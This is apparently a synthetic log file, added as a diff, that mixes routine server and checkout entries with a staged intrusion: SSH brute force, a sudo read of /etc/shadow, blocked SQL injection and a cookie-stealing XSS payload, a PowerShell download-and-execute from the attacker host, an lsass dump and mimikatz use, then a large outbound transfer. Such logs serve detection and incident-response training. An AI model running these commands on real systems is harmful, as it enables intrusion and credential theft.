@@ -1,0 +1,32 @@
+Jul  7 09:02:11 web-prod-01 nginx[1102]: 198.51.100.14 - - "GET /health HTTP/1.1" 200 43 "-" "Render/health-check"
+Jul  7 09:03:27 web-prod-01 sshd[2231]: Accepted password for deploy from 10.20.4.11 port 51122 ssh2
+Jul  7 09:03:27 web-prod-01 sshd[2231]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jul  7 09:05:44 web-prod-01 CRON[2410]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jul  7 09:05:45 web-prod-01 CRON[2410]: pam_unix(cron:session): session closed for user root
+2026-07-07 09:08:12 INFO checkout-api order=88231 status=completed amount=129.99 latency_ms=182
+2026-07-07 09:09:55 INFO checkout-api order=88232 status=completed amount=54.50 latency_ms=143
+Jul  7 09:14:02 web-prod-01 sshd[3390]: Failed password for invalid user admin from 203.0.113.45 port 40122 ssh2
+Jul  7 09:14:19 web-prod-01 sshd[3394]: Failed password for invalid user admin from 203.0.113.45 port 40160 ssh2
+Jul  7 09:14:36 web-prod-01 sshd[3399]: Failed password for invalid user administrator from 203.0.113.45 port 40204 ssh2
+Jul  7 09:14:58 web-prod-01 sshd[3405]: Failed password for invalid user root from 203.0.113.45 port 40233 ssh2
+Jul  7 09:15:21 web-prod-01 sshd[3411]: Failed password for invalid user oracle from 203.0.113.45 port 40269 ssh2
+Jul  7 09:15:43 web-prod-01 sshd[3418]: Failed password for svc-backup from 203.0.113.45 port 40301 ssh2
+Jul  7 09:16:04 web-prod-01 sshd[3422]: Failed password for svc-backup from 203.0.113.45 port 40342 ssh2
+Jul  7 09:16:42 web-prod-01 sshd[3431]: Accepted password for svc-backup from 203.0.113.45 port 40388 ssh2
+Jul  7 09:16:42 web-prod-01 sshd[3431]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Jul  7 09:18:09 web-prod-01 sudo[3502]: svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Jul  7 09:18:31 web-prod-01 sudo[3508]: svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
+Jul  7 09:19:02 web-prod-01 auth[3521]: user svc-backup added to administrators group by uid=0
+2026-07-07 09:21:17 ERROR webapp request GET /products?id=1 UNION SELECT username,password FROM users -- from 198.51.100.23 blocked by WAF rule sqli-001
+2026-07-07 09:21:44 ERROR webapp request GET /search?q=test' OR 1=1 -- from 198.51.100.23 blocked by WAF rule sqli-002
+2026-07-07 09:22:30 ERROR webapp request POST /comments body contains <script>document.location='http://198.51.100.23/c?'+document.cookie</script> from 198.51.100.23 blocked by WAF rule xss-001
+2026-07-07 09:24:05 WARNING checkout-api order=88233 status=payment_declined amount=740.00 retry=1
+Jul  7 09:27:12 win-dc-02 sysmon: EventID=1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0" User=CORP\svc-backup
+Jul  7 09:28:03 win-dc-02 sysmon: EventID=1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage2.ps1')" User=CORP\svc-backup
+Jul  7 09:31:40 win-dc-02 sysmon: EventID=10 SourceImage=C:\Tools\procdump64.exe TargetImage=C:\Windows\System32\lsass.exe CallTrace=procdump -ma lsass.exe lsass.dmp User=CORP\svc-backup
+Jul  7 09:33:15 win-dc-02 defender: detected tool mimikatz sekurlsa::logonpasswords execution attempt by user svc-backup event_id=1116
+2026-07-07 09:36:48 WARNING netflow outbound transfer 412MB from 10.20.4.30 to 203.0.113.45:8443 duration=290s protocol=tls
+2026-07-07 09:38:20 INFO checkout-api order=88234 status=completed amount=19.99 latency_ms=155
+Jul  7 09:40:55 web-prod-01 sshd[3610]: pam_unix(sshd:session): session closed for user svc-backup
+2026-07-07 09:41:22 INFO backup-agent nightly snapshot completed volume=/var/lib/postgresql size=2.1GB
+2026-07-07 09:45:00 INFO checkout-api order=88235 status=completed amount=310.00 latency_ms=201
